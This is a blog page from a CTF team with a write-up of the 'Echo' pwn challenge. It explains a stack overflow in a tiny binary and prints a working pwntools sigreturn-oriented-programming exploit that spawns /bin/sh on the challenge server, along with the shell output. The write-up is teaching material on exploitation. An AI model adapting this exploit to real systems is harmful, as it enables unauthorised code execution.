@@ -1,0 +1,110 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>Echo | fernetInjection</title><meta name=description content="We are fernetInjection, a CTF team from Argentina 🇦🇷. Here you can find our write-ups and reflections."><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:title" content="Echo"><meta property="og:description" content="Recon Let&rsquo;s see what checksec has to say about this challenge:
+$ checksec --file=./echo RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE No RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 8) Symbols No 0 0 ./echo It looks like there&rsquo;s not a whole lot of mitigations enabled in this binary. After firing up cutter and analyzing the binary we find that it&rsquo;s not even linked against libc."><meta property="og:type" content="article"><meta property="og:url" content="https://fernetinjection.github.io/posts/2021-02-01-echo/"><meta property="article:published_time" content="2021-02-01T09:00:00+00:00"><meta property="article:modified_time" content="2021-02-01T09:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Echo"><meta name=twitter:description content="Recon Let&rsquo;s see what checksec has to say about this challenge:
+$ checksec --file=./echo RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE No RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 8) Symbols No 0 0 ./echo It looks like there&rsquo;s not a whole lot of mitigations enabled in this binary. After firing up cutter and analyzing the binary we find that it&rsquo;s not even linked against libc."><link rel=stylesheet href=https://fernetinjection.github.io/css/style-dark.css><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://fernetinjection.github.io/images/favicon.ico></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a><a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a><a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast');" style=display:none><i class="fas fa-chevron-up fa-lg"></i></a><span id=menu><span id=nav><ul><li><a href=/>Home</a></li><li><a href=/posts>Writings</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://fernetinjection.github.io/posts/2021-02-01-external/><i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li><li><a class=icon href=https://fernetinjection.github.io/posts/2021-02-01-cli-browser/><i class="fas fa-chevron-right" aria-hidden=true onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li><li><a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast');"><i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li><li><a class=icon href=#><i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
+<span id=i-next class=info style=display:none>Next post</span>
+<span id=i-top class=info style=display:none>Back to top</span>
+<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f"><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&text=Echo"><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&title=Echo"><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&is_video=false&description=Echo"><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=Echo&body=Check out this article: https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f"><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&title=Echo"><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&title=Echo"><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.stumbleupon.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&title=Echo"><i class="fab fa-stumbleupon" aria-hidden=true></i></a></li><li><a class=icon href="http://digg.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&title=Echo"><i class="fab fa-digg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&name=Echo&description=Recon%20Let%26rsquo%3bs%20see%20what%20checksec%20has%20to%20say%20about%20this%20challenge%3a%0a%24%20checksec%20--file%3d.%2fecho%20RELRO%20STACK%20CANARY%20NX%20PIE%20RPATH%20RUNPATH%20Symbols%20FORTIFY%20Fortified%20Fortifiable%20FILE%20No%20RELRO%20No%20canary%20found%20NX%20disabled%20No%20PIE%20No%20RPATH%20No%20RUNPATH%208%29%20Symbols%20No%200%200%20.%2fecho%20It%20looks%20like%20there%26rsquo%3bs%20not%20a%20whole%20lot%20of%20mitigations%20enabled%20in%20this%20binary.%20After%20firing%20up%20cutter%20and%20analyzing%20the%20binary%20we%20find%20that%20it%26rsquo%3bs%20not%20even%20linked%20against%20libc."><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&t=Echo"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#sigreturn-a-useful-ally><code>sigreturn</code>, a useful ally</a></li><li><a href=#putting-it-all-together>Putting it all together</a></li></ul></li></ul></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">Echo</h1><div class=meta><div class=postdate><time datetime="2021-02-01 09:00:00 +0000 UTC" itemprop=datePublished>2021-02-01</time></div><div class=article-category><i class="fas fa-archive"></i><a class=category-link href=/categories/ctf>CTF</a></div><div class=article-tag><i class="fas fa-tag"></i><a class=tag-link href=/tags/pwn rel=tag>Pwn</a>
+<a class=tag-link href=/tags/ctf_0x41414141 rel=tag>CTF_0x41414141</a>
+<a class=tag-link href=/tags/exploitation rel=tag>Exploitation</a></div></div></header><div class=content itemprop=articleBody><h2 id=recon>Recon</h2><p>Let&rsquo;s see what <code>checksec</code> has to say about this challenge:</p><pre><code>$ checksec --file=./echo 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   8) Symbols        No    0               0               ./echo
+</code></pre><p>It looks like there&rsquo;s not a whole lot of mitigations enabled in this binary. After firing up <code>cutter</code> and analyzing the binary we find that it&rsquo;s not even linked against libc. After taking a look at the code we find that it&rsquo;s pretty short as well:</p><pre><code>;-- echo:
+0x00401000      push    rbp        ; [01] -r-x section size 78 named .text
+0x00401001      mov     rbp, rsp
+0x00401004      sub     rsp, 0x300
+
+		; uint64_t read = read(0, rsp + 0x180, 0x300)
+0x0040100b      mov     eax, 0
+0x00401010      mov     edi, 0
+0x00401015      lea     rsi, [rsp + 0x180]
+0x0040101d      mov     edx, 0x300 ; 768
+0x00401022      syscall
+
+		; write(1, rsp + 0x180, read)
+0x00401024      mov     rdx, rax
+0x00401027      mov     eax, 1
+0x0040102c      mov     edi, 1
+0x00401031      syscall
+
+		; return
+0x00401033      leave
+0x00401034      ret
+
+		; &quot;/bin/sh&quot; (this is not code, it's just a string
+                ;            in the middle of the .text section)
+0x00401035      invalid
+0x00401036      invalid
+0x00401037      imul    ebp, dword [rsi + 0x2f], 0xe8006873
+  ;-- _start:
+  ;-- rip:
+17: entry0 ();
+		; echo()
+0x0040103d      call    echo
+
+		; exit(0)
+0x00401042      mov     eax, 0x3c  ; '&lt;' ; 60
+0x00401047      mov     edi, 0
+0x0040104c      syscall
+
+; comments added for clarity
+</code></pre><p>The functionality looks pretty clear, this program reads <code>0x300</code> characters from <code>stdin</code>, and writes them to <code>stdout</code>. That gets done inside a function called <code>echo</code>, afterwards <code>exit(0)</code> is executed. As a bonus, we get the string <code>"/bin/sh"</code> for free, since it&rsquo;s hardcoded at address <code>0x401035</code> (PIE not being enabled means that that string will always be located at that address, the same goes for any other address within the binary as well).</p><p>Now let&rsquo;s take a closer look at where our input will be stored: looking at the code at <code>0x401000</code> through <code>0x401022</code> we can notice that <code>0x300</code> bytes are reserved in the stack (that&rsquo;s exactly the amount of bytes that will be read into the buffer). This means that <code>rsp</code> points to a buffer of size <code>0x300</code>, but <code>read</code> will read <code>0x300</code> bytes into <code>rsp + 0x180</code>. In short, we&rsquo;ve got a buffer overflow here. This means that we can overwrite the <code>rip</code> stored in the stack and &lsquo;return&rsquo; to whatever address we want. This all looks pretty nice, except for a small detail: it looks like we&rsquo;ve got nowhere to jump to. There are no <code>pop</code> gadgets, no <code>csu</code>, nothing.</p><h2 id=exploitation>Exploitation</h2><p>We&rsquo;ve identified the vulnerability at play here, but it&rsquo;s not immediately obvious how we would go about making use of it. Ideally we&rsquo;d like to invoke <code>execve(0x401035, 0, 0)</code> (given that the string <code>"/bin/sh"</code> is conveniently placed at that address), but we&rsquo;ve got no way of controlling <code>rdi</code>, <code>rsi</code> or <code>rdx</code>.</p><p>We do, however, have a way of controlling <code>rax</code>. Once a call to <code>read</code> or <code>write</code> is made, the amount of read/written bytes is returned in <code>rax</code>. If when <code>echo</code> asks for input, we feed it <code>N</code> bytes, those bytes will be read, then printed, and as a result <code>rax</code> will be equal to <code>N</code> when the function returns. This means we can choose what syscall we want to invoke, but not it&rsquo;s arguments.</p><h3 id=sigreturn-a-useful-ally><code>sigreturn</code>, a useful ally</h3><p>A very interesting syscall is <code>sigreturn</code>, which will just &lsquo;undo&rsquo; everything done by the kernel when a signal needs to be handled in a Linux process.</p><p>If you&rsquo;re unfamiliar with Linux signals, you can check out the <a href=https://man7.org/linux/man-pages/man7/signal.7.html>man page</a> on signals. Pretty quickly, they&rsquo;re a form of IPC (inter-process communication) in which a program sets up a &lsquo;signal handler&rsquo; which will be invoked every time a given signal is received (they can be sent by other programs, or by the kernel itself). Once the signal handler is done doing it&rsquo;s thing, the entire state of the program needs to be restored from the stack. This is exactly where <code>sigreturn</code> kicks in.</p><p>I highly recommend that you check out <a href=https://man7.org/linux/man-pages/man2/sigreturn.2.html><code>sigreturn</code>&rsquo;s <code>man</code> page</a>, but the gist of it is that the entire state of the processor will be restored from the user-space stack. The layout of the stack when calling <code>sigreturn</code> should look like this:</p><p><img src=https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Sigret_stackframe.svg/170px-Sigret_stackframe.svg.png alt="Iamge of stack layout"></p><blockquote><p>Image taken from <a href=https://en.wikipedia.org/wiki/Sigreturn-oriented_programming>Wikipedia&rsquo;s article</a> on SigReturn Oriented Programming (SROP)</p></blockquote><p>Keep in mind that in the diagram above, the bottom of the image represents the least significant memory address (that means elements will be &lsquo;popped&rsquo; starting from the bottom).</p><p>Now, if we fill the stack with a frame like this and then call sigreturn, we could set the value of <code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code> and <code>rip</code> to <code>0x3b</code> (the syscall number for <code>execve</code>), <code>0x401035</code> (the address for <code>"/bin/sh"</code>), <code>0x0</code>, <code>0x0</code> and <code>0x40104c</code> (the address for a <code>syscall</code> instruction), respectively. Something important to bear in mind, is that this is a lot of data, and is only possible because the buffer overflow is big enough.</p><h3 id=putting-it-all-together>Putting it all together</h3><p>Time for a quick recap of the plan:</p><ul><li>Feed the program a malicious sigreturn-frame and start a ROP chain.</li><li>Execute <code>write(1, [whatever], 0xf)</code> so that <code>rax</code> gets set to <code>0xf</code>.</li><li>Jump to a <code>syscall</code> instruction (<code>rax</code> is equall to <code>0xf</code> so it will trigger a call to <code>sigreturn</code>).</li><li>Our frame will be read from the stack and we&rsquo;ve got ourselves a shell!</li></ul><p>Constructing the frame can be annoying though, luckily pwntools provides us with a function for that.</p><p>Here&rsquo;s the actual exploit:</p><pre><code>from pwn import *
+
+context.update(os='linux', arch='amd64')
+
+p = remote('185.172.165.118', 9090)
+
+# Prepare a sigret frame with the desired values
+frame = SigreturnFrame(kernel='amd64')
+frame.rip = 0x40104c                # rip -&gt; syscall
+frame.rdi = 0x401035                # rdi -&gt; &quot;/bin/sh&quot;
+frame.rsi = 0x0                     # rsi -&gt; NULL
+frame.rdx = 0x0                     # rdx -&gt; NULL
+frame.rax = 0x3b                    # rax -&gt; execve
+
+payload = b''
+payload += b'A' * (0x300 - 0x180)   # fill the buffer
+payload += b'A' * 0x8               # overwrite rbp
+payload += p64(0x401000)            # rip -&gt; echo (this will trigger the read and write that
+                                    # we talked about earlier. Since we're jumping to the
+                                    # first instruction in the function, it will create it's
+                                    # own stack frame and then destroy it, so it doesn't affect
+                                    # the rest of the exploit)
+payload += p64(0x40104c)            # echo.ret -&gt; syscall
+payload += bytes(frame)             # sigframe
+
+# Check that our payload fits in the buffer
+if len(payload) &gt; 0x300:
+    p.error(f'Payload too large ({hex(len(payload))}B)')
+
+# Send the malicious stack
+p.send(payload)
+p.recv(len(payload))
+
+# echo will be waiting for a second read, let's send
+# it 0xf bytes so that rax gets set to that value
+p.send(0xf * b'A')
+p.recv(0xf)
+
+# Profit
+p.interactive()
+</code></pre><p>And here&rsquo;s the exploit in action:</p><pre><code>$ python3 exploit.py
+[+] Opening connection to 185.172.165.118 on port 9090: Done
+[*] Switching to interactive mode
+$ ls
+bin
+dev
+echo
+etc
+flag.txt
+lib
+lib32
+lib64
+libx32
+usr
+$ cat flag.txt
+flag{a2e14ad30c012978fc870c1f529e8156}
+$
+</code></pre><hr><h1 id=post-written-by-octaviogallandhttpsgithubcomoctaviogalland>Post written by <a href=https://github.com/OctavioGalland>@OctavioGalland</a></h1></div></article><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/>Home</a></li><li><a href=/posts>Writings</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#sigreturn-a-useful-ally><code>sigreturn</code>, a useful ally</a></li><li><a href=#putting-it-all-together>Putting it all together</a></li></ul></li></ul></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f"><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&text=Echo"><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&title=Echo"><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&is_video=false&description=Echo"><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=Echo&body=Check out this article: https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f"><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&title=Echo"><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&title=Echo"><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.stumbleupon.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&title=Echo"><i class="fab fa-stumbleupon fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://digg.com/submit?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&title=Echo"><i class="fab fa-digg fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&name=Echo&description=Recon%20Let%26rsquo%3bs%20see%20what%20checksec%20has%20to%20say%20about%20this%20challenge%3a%0a%24%20checksec%20--file%3d.%2fecho%20RELRO%20STACK%20CANARY%20NX%20PIE%20RPATH%20RUNPATH%20Symbols%20FORTIFY%20Fortified%20Fortifiable%20FILE%20No%20RELRO%20No%20canary%20found%20NX%20disabled%20No%20PIE%20No%20RPATH%20No%20RUNPATH%208%29%20Symbols%20No%200%200%20.%2fecho%20It%20looks%20like%20there%26rsquo%3bs%20not%20a%20whole%20lot%20of%20mitigations%20enabled%20in%20this%20binary.%20After%20firing%20up%20cutter%20and%20analyzing%20the%20binary%20we%20find%20that%20it%26rsquo%3bs%20not%20even%20linked%20against%20libc."><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-echo%2f&t=Echo"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu class=icon href=# onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden=true></i>Menu</a>
+<a id=toc class=icon href=# onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden=true></i>TOC</a>
+<a id=share class=icon href=# onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden=true></i>share</a>
+<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i>Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2021 fernetInjection</div><div class=footer-right><nav><ul><li><a href=/>Home</a></li><li><a href=/posts>Writings</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script></html>
